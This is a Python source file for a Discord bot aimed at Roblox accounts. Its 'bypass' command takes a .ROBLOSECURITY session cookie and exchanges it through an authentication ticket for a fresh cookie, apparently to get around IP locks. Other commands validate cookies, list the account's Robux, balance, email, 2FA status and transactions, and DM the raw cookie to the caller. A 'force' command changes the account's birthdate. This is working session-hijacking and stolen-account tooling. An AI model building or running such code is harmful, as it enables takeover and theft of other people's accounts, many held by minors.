import nextcord
from nextcord.ext import commands
import requests
import os
from dotenv import load_dotenv
from flask import Flask
from re import findall

# Load environment variables
load_dotenv()

# Get Discord Token from environment variables
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")

app = Flask(__name__)

@app.route("/")
def home():
    return "Bot is running!"

# Get the port from the environment or use 8080
PORT = int(os.getenv("PORT", 8080))

# Roblox-related functionality
class Bypass:
    def __init__(self, cookie: str) -> None:
        self.cookie = cookie

    def start_process(self) -> str:
        self.xcsrf_token = self.get_csrf_token()
        if "Error" in self.xcsrf_token:
            return self.xcsrf_token

        self.rbx_authentication_ticket = self.get_rbx_authentication_ticket()
        if "Error" in self.rbx_authentication_ticket:
            return self.rbx_authentication_ticket

        return self.get_set_cookie()

    def get_set_cookie(self) -> str:
        response = requests.post(
            "https://auth.roblox.com/v1/authentication-ticket/redeem",
            headers={"rbxauthenticationnegotiation": "1"},
            json={"authenticationTicket": self.rbx_authentication_ticket}
        )
        set_cookie_header = response.headers.get("set-cookie")
        if not set_cookie_header:
            return "Error: Unable to retrieve set_cookie."
        return set_cookie_header.split(".ROBLOSECURITY=")[1].split(";")[0]

    def get_rbx_authentication_ticket(self) -> str:
        response = requests.post(
            "https://auth.roblox.com/v1/authentication-ticket",
            headers={
                "rbxauthenticationnegotiation": "1",
                "referer": "https://www.roblox.com/camel",
                "Content-Type": "application/json",
                "x-csrf-token": self.xcsrf_token
            },
            cookies={".ROBLOSECURITY": self.cookie}
        )
        ticket = response.headers.get("rbx-authentication-ticket")
        if not ticket:
            return "Error: Unable to retrieve authentication ticket."
        return ticket

    def get_csrf_token(self) -> str:
        response = requests.post(
            "https://auth.roblox.com/v2/logout", 
            cookies={".ROBLOSECURITY": self.cookie}
        )
        xcsrf_token = response.headers.get("x-csrf-token")
        if not xcsrf_token:
            return "Error: Invalid cookie. Sorry."
        return xcsrf_token

# Discord Bot Setup
intents = nextcord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    await bot.change_presence(
        status=nextcord.Status.dnd, 
        activity=nextcord.Game("WACTHING !help")
    )

# Existing bypass command
@bot.command()
@commands.cooldown(1, 5, commands.BucketType.user) 
async def bypass(ctx, cookie: str):
    try:
        bypasser = Bypass(cookie)
        result = bypasser.start_process()

        embed = nextcord.Embed()
        if "Error" in result:
            embed.title = "Bypass Failed"
            embed.description = result
            embed.color = nextcord.Color.red()
        else:
            embed.title = "Iplockbypass Successful"
            embed.description = f"{result}"
            embed.color = nextcord.Color.green()

        await ctx.send(embed=embed)
    except Exception as e:
        error_embed = nextcord.Embed(
            title="Error",
            description=str(e),
            color=nextcord.Color.red()
        )
        await ctx.send(embed=error_embed)
            
@bot.command()
@commands.cooldown(1, 5, commands.BucketType.user) 
async def vc(ctx, cookie=None):
    if not cookie:
        await ctx.send(embed=nextcord.Embed(title=":x: Missing Cookie", description="", color=0xFF0000))
        return

    # Skip message deletion in DMs
    if not isinstance(ctx.channel, nextcord.DMChannel):
        await ctx.message.delete()

    response = requests.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': cookie})
    if '"id":' in response.text:
        embedVar = nextcord.Embed(title=":white_check_mark: Valid Cookie", description="", color=0x38d13b)
        embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
        await dm.send(embed=nextcord.Embed(title=":white_check_mark: Cookie", description='```'+cookie+'```', color=0x38d13b))
        await ctx.send(embed=embedVar)
    elif 'Unauthorized' in response.text:
        embedVar = nextcord.Embed(title=":x: Invalid Cookie", description="", color=0xFF0000)
        embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
        await ctx.send(embed=embedVar)
    else:
        embedVar = nextcord.Embed(title=":x: Error", description="", color=0xFFFF00)
        embedVar.add_field(name="Error: ", value='```'+response.text+'```', inline=False)
        await ctx.send(embed=embedVar)

@bot.command()
@commands.cooldown(1, 5, commands.BucketType.user) 
async def vcr(ctx, cookie=None):
    if not cookie:
        await ctx.send(embed=nextcord.Embed(title=":x: Missing Cookie", description="", color=0xFF0000))
        return

    # Skip message deletion in DMs
    if not isinstance(ctx.channel, nextcord.DMChannel):
        await ctx.message.delete()

    response = requests.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': cookie})
    if '"id":' in response.text:
        user_id = response.json()['id']
        robux = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency', cookies={'.ROBLOSECURITY': cookie}).json()['robux']
        embedVar = nextcord.Embed(title=":white_check_mark: Valid Cookie", description="", color=0x38d13b)
        embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
        embedVar.add_field(name=":money_mouth: Robux", value=robux, inline=True)
        dm = await ctx.author.create_dm()
        await dm.send(embed=nextcord.Embed(title=":white_check_mark: Cookie", description='```'+cookie+'```', color=0x38d13b))
        await ctx.send(embed=embedVar)
    elif 'Unauthorized' in response.text:
        embedVar = nextcord.Embed(title=":x: Invalid Cookie", description="", color=0xFF0000)
        embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
        await ctx.send(embed=embedVar)
    else:
        embedVar = nextcord.Embed(title=":x: Error", description="", color=0xFFFF00)
        embedVar.add_field(name="Error: ", value='```'+response.text+'```', inline=False)
        await ctx.send(embed=embedVar)

@bot.command()
@commands.cooldown(1, 5, commands.BucketType.user) 
async def full(ctx, cookie=None):
    if not cookie:
        await ctx.send(embed=nextcord.Embed(title=":x: Missing Cookie", description="", color=0xFF0000))
        return

    # Skip message deletion in DMs
    if not isinstance(ctx.channel, nextcord.DMChannel):
        await ctx.message.delete()

    response = requests.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': cookie})
    hidden = '```                       Hidden                  ```'
    if '"id":' in response.text:
        user_id = response.json()['id']
        robux = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency', cookies={'.ROBLOSECURITY': cookie}).json()['robux']
        balance_creit_info = requests.get(f'https://billing.roblox.com/v1/credit', cookies={'.ROBLOSECURITY': cookie})
        balance_credit = balance_creit_info.json()['balance']
        balance_credit_currency = balance_creit_info.json()['currencyCode']
        account_settings = requests.get(f'https://www.roblox.com/my/settings/json', cookies={'.ROBLOSECURITY': cookie})
        account_name = account_settings.json()['Name']
        account_display_name = account_settings.json()['DisplayName']
        account_email_verified = account_settings.json()['IsEmailVerified']
        if bool(account_email_verified):
            account_email_verified = f'{account_email_verified} (`{account_settings.json()["UserEmail"]}`)'
        account_above_13 = account_settings.json()['UserAbove13']
        account_age_in_years = round(float(account_settings.json()['AccountAgeInDays']/365),2)
        account_has_premium = account_settings.json()['IsPremium']
        account_has_pin = account_settings.json()['IsAccountPinEnabled']
        account_2step = account_settings.json()['MyAccountSecurityModel']['IsTwoStepEnabled']
        embedVar = nextcord.Embed(title=":white_check_mark: Valid Cookie", description="", color=0x38d13b)
        embedVar.add_field(name="Passed Cookie: ", value=hidden, inline=False)
        embedVar.add_field(name=":money_mouth: Robux", value=robux, inline=True)
        embedVar.add_field(name=":moneybag: Balance", value=f'{balance_credit} {balance_credit_currency}', inline=True)
        embedVar.add_field(name=":bust_in_silhouette: Account Name", value=f'{account_name} ({account_display_name})', inline=True)
        embedVar.add_field(name=":email: Email", value=account_email_verified, inline=True)
        embedVar.add_field(name=":calendar: Account Age", value=f'{account_age_in_years} years', inline=True)
        embedVar.add_field(name=":baby: Above 13", value=account_above_13, inline=True)
        embedVar.add_field(name=":star: Premium", value=account_has_premium, inline=True)
        embedVar.add_field(name=":key: Has PIN", value=account_has_pin, inline=True)
        embedVar.add_field(name=":lock: 2-Step Verification", value=account_2step, inline=True)
        account_friends = requests.get('https://friends.roblox.com/v1/my/friends/count', cookies={'.ROBLOSECURITY': cookie}).json()['count']
        embedVar.add_field(name=":busts_in_silhouette: Friends", value=account_friends, inline=True)
        account_voice_verified = requests.get('https://voice.roblox.com/v1/settings', cookies={'.ROBLOSECURITY': cookie}).json()['isVerifiedForVoice']
        embedVar.add_field(name=":microphone2: Voice Verified", value=account_voice_verified, inline=True)
        account_gamepasses = requests.get(f'https://www.roblox.com/users/inventory/list-json?assetTypeId=34&cursor=&itemsPerPage=100&pageNumber=1&userId={user_id}', cookies={'.ROBLOSECURITY': cookie})
        check = findall(r'"PriceInRobux":(.*?),', account_gamepasses.text)
        account_gamepasses = str(sum([int(match) if match != "null" else 0 for match in check]))+f' R$'
        embedVar.add_field(name=":video_game: Gamepasses Worth", value=account_gamepasses, inline=True)
        account_badges = ', '.join(list(findall(r'"name":"(.*?)"', requests.get(f'https://accountinformation.roblox.com/v1/users/{user_id}/roblox-badges', cookies={'.ROBLOSECURITY': cookie}).text)))
        embedVar.add_field(name=":medal: Badges", value=account_badges, inline=True)
        account_transactions = requests.get(f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Year&transactionType=summary', cookies={'.ROBLOSECURITY': cookie}).json()
        account_sales_of_goods = account_transactions['salesTotal']
        account_purchases_total = abs(int(account_transactions['purchasesTotal']))
        account_commissions = account_transactions['affiliateSalesTotal']
        account_robux_purchcased = account_transactions['currencyPurchasesTotal']
        account_premium_payouts_total = account_transactions['premiumPayoutsTotal']
        account_pending_robux = account_transactions['pendingRobuxTotal']
        embedVar.add_field(name="**↻** Transactions", value=f':small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: ', inline=False)
        embedVar.add_field(name=":coin: Sales of Goods", value=account_sales_of_goods, inline=True)
        embedVar.add_field(name="💰 Premium Payouts", value=account_premium_payouts_total, inline=True)
        embedVar.add_field(name="📈 Commissions", value=account_commissions, inline=True)
        embedVar.add_field(name=":credit_card: Robux purchased", value=account_robux_purchcased, inline=True)
        embedVar.add_field(name="🚧 Pending", value=account_pending_robux, inline=True)
        embedVar.add_field(name=":money_with_wings:  Overall", value=account_purchases_total, inline=True)
        embedVar.set_thumbnail(url=requests.get(f'https://thumbnails.roblox.com/v1/users/avatar-headshot?size=48x48&format=png&userIds={user_id}').json()['data'][0]['imageUrl'])
        dm = await ctx.author.create_dm()
        await ctx.send(embed=embedVar)
        embedVar.add_field(name="Passed Cookie: ", value=cookie, inline=False)
        await dm.send(embed=embedVar)
    elif 'Unauthorized' in response.text:
        embedVar = nextcord.Embed(title=":x: Invalid Cookie", description="", color=0xFF0000)
        embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
        await ctx.send(embed=embedVar)
    else:
        embedVar = nextcord.Embed(title=":x: Error", description="", color=0xFFFF00)
        embedVar.add_field(name="Error: ", value='```'+response.text+'```', inline=False)
        await ctx.send(embed=embedVar)
        
@bot.command()
@commands.cooldown(1, 10, commands.BucketType.user)
async def force(ctx, cookie: str, password: str):
    try:
        # Step 1: Authenticate the cookie and password
        bypasser = Bypass(cookie)
        new_cookie = bypasser.start_process()

        if "Error" in new_cookie:
            await ctx.send(f"Bypass failed: {new_cookie}")
            return

        # Step 2: Get fresh CSRF token with new cookie
        xcsrf_token = bypasser.get_csrf_token()

        headers = {
            "x-csrf-token": xcsrf_token,
            "Content-Type": "application/json",
            "User-Agent": "Roblox/WinInet"
        }

        # Step 3: Change the birthdate using the provided cookie and password
        response = requests.post(
            "https://accountinformation.roblox.com/v1/birthdate",
            headers=headers,
            cookies={".ROBLOSECURITY": new_cookie},
            json={
                "birthMonth": 1,
                "birthDay": 1,
                "birthYear": 2012  # Customize this for age change
            }
        )

        # Step 4: Check if CAPTCHA challenge is required
        if response.status_code == 200:
            await ctx.send("Successfully changed account age.")
        elif "challenge" in response.text.lower():
            # Suppress the challenge error message
            await ctx.send("Age change failed due to a security challenge.")
        else:
            await ctx.send(f"Failed to change age. Roblox responded with: {response.text}")

    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")

# Start Flask server and bot together
if __name__ == "__main__":
    from threading import Thread

    # Start Flask server in a separate thread
    Thread(target=lambda: app.run(host="0.0.0.0", port=PORT)).start()

bot.run(DISCORD_TOKEN)
